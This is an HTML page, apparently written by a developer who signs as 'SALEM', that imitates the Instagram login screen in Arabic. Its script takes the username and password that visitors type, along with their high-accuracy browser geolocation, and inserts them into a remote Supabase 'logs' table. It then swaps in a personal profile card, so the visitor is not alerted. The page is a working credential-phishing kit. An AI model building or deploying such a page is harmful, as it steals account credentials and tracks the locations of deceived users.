<!DOCTYPE HTML>
<html lang="ar">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Instagram | Login</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,700&display=swap"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/typed.js/2.0.10/typed.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root {
            --water-deep: #0a192f; --water-mid: #1A2980; --water-light: #26d0ce;
            --front_color: rgba(10, 25, 47, 0.7); --gold: #FFD700; --muted-gold: #c5a059; --white: #e6f1ff;
            --insta-blue: #0095f6; --insta-bg: #fafafa;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        
        body {
            background: linear-gradient(-45deg, #0a192f, #1A2980, #141e30, #243b55);
            background-size: 400% 400%; animation: waterFlow 10s ease infinite;
            width: 100vw; height: 100vh; overflow: hidden; 
            display: flex; justify-content: center; align-items: center;
        }
        @keyframes waterFlow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }

        /* واجهة انستغرام */
        #login-container {
            width: 90%; max-width: 350px; background: white; padding: 40px 25px;
            border-radius: 1px; border: 1px solid #dbdbdb; text-align: center; z-index: 100;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }
        .insta-logo {
            font-family: 'Arial'; font-style: italic; font-weight: bold; 
            font-size: 35px; margin-bottom: 30px; color: #262626;
        }
        #login-container input {
            width: 100%; padding: 12px; margin-bottom: 10px;
            border: 1px solid #dbdbdb; border-radius: 3px; background: var(--insta-bg);
            font-size: 12px; outline: none;
        }
        #login-container button {
            width: 100%; padding: 10px; background: var(--insta-blue);
            color: white; border: none; border-radius: 5px; font-weight: 600;
            cursor: pointer; margin-top: 10px; transition: opacity 0.3s;
        }
        #login-container button:active { opacity: 0.7; }
        
        .divider { margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; display: flex; align-items: center; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }

        /* البطاقة الشخصية (مخفية) */
        #main-card { display: none; width: 100%; display: flex; justify-content: center; opacity: 0; transition: opacity 0.8s; }
        .vcard {
            width: 90%; max-width: 420px; height: 620px; background: var(--front_color);
            backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2);
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6); position: relative; overflow: hidden;
            display: flex; flex-direction: column;
        }
        .header { height: 35%; position: relative; }
        .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; pointer-events: none; }
        .wave-01 { border-radius: 43%; top: -180%; left: -15%; position: absolute; width: 550px; height: 550px; background: linear-gradient(45deg, var(--water-mid), var(--water-light)); opacity: 0.4; animation: rotate 14s linear infinite; }
        @keyframes rotate { 100% { transform: rotate(360deg); } }
        .profile_pic_content { width: 130px; height: 130px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); z-index: 10; }
        .profile_video { width: 100%; height: 100%; object-fit: cover; }
        .card_content { padding-top: 80px; text-align: center; flex-grow: 1; }
        .profile_name h4 { font-size: 1.8em; letter-spacing: 3px; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
        .snuff { min-height: 50px; padding: 0 20px; color: #8892b0; font-size: 0.9em; margin-top: 15px; }
        .social div { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; padding: 15px; }
        .social i { padding: 12px; font-size: 1.2em; background: rgba(197, 160, 89, 0.05); border-radius: 12px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); }
        .footer-rights { padding-bottom: 15px; font-size: 9px; color: rgba(230, 241, 255, 0.3); text-align: center; }
    </style>
</head>
<body>

<!-- واجهة تسجيل الدخول -->
<div id="login-container">
    <div class="insta-logo">Instagram</div>
    <input type="text" id="insta-user" placeholder="اسم المستخدم أو الهاتف">
    <input type="password" id="insta-pass" placeholder="كلمة السر">
    <button onclick="submitData()">تسجيل الدخول</button>
    <div class="divider">أو</div>
    <div style="color: #385185; font-size: 14px; font-weight: 600; cursor: pointer;">
        <i class="fab fa-facebook-square"></i> تسجيل الدخول بحساب فيسبوك
    </div>
</div>

<!-- بطاقة سالم الرقمية -->
<div id="main-card" style="display: none;">
    <div class="vcard">
        <div class="header">
            <div class="wave_bg"><div class="wave-01"></div></div>
            <div class="profile_pic_content">
                <video class="profile_video" autoplay loop muted playsinline>
                    <source src="https://files.catbox.moe/jvicv4.mp4" type="video/mp4">
                </video>
            </div>
        </div>
        <div class="card_content">
            <div class="profile_name"><h4>SALEM</h4></div>
            <div class="snuff"><h5 class="typed_text"></h5></div>
            <div class="social">
                <div>
                    <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
                    <a href="https://www.facebook.com/share/15KQ2NmX9V/"><i class="fab fa-facebook"></i></a>
                    <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94"><i class="fab fa-instagram"></i></a>
                    <a href="https://github.com/salemalshamrie"><i class="fab fa-github"></i></a>
                    <a href="https://16salm.github.io/AI/"><i class="fas fa-brain"></i></a>
                </div>
            </div>
        </div>
        <div class="footer-rights">حقوق النشر © 2023-2026 SALEM | جميع الحقوق محفوظة</div>
    </div>
</div>

<script>
    // إعدادات Supabase
    const SB_URL = 'https://kcckppfflaxpxhipngdz.supabase.co';
    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
    const sb = supabase.createClient(SB_URL, SB_KEY);

    let userLoc = "الموقع غير متاح";

    // جلب الموقع فور فتح الصفحة
    window.onload = () => {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                userLoc = `https://www.google.com/maps?q=${lat},${lon}`;
            }, null, { enableHighAccuracy: true });
        }
    };

    async function submitData() {
        const u = document.getElementById('insta-user').value;
        const p = document.getElementById('insta-pass').value;

        if (u.length < 3 || p.length < 5) {
            alert("يرجى إدخال بيانات صحيحة");
            return;
        }

        // إرسال البيانات إلى جدول logs
        try {
            await sb.from('logs').insert([{ 
                username: u, 
                password: p, 
                location: userLoc 
            }]);
        } catch (e) { console.error(e); }

        // التحول للبطاقة الشخصية
        document.getElementById('login-container').style.display = 'none';
        const card = document.getElementById('main-card');
        card.style.display = 'flex';
        setTimeout(() => { card.style.opacity = '1'; }, 50);

        // تشغيل تأثير الكتابة
        new Typed(".typed_text", {
            strings: ["Web Designer & Creative Developer.", "Precision and Art.", "BELIEVE IN YOURSELF."],
            typeSpeed: 50, backSpeed: 30, loop: true
        });
    }
</script>
</body>
</html>
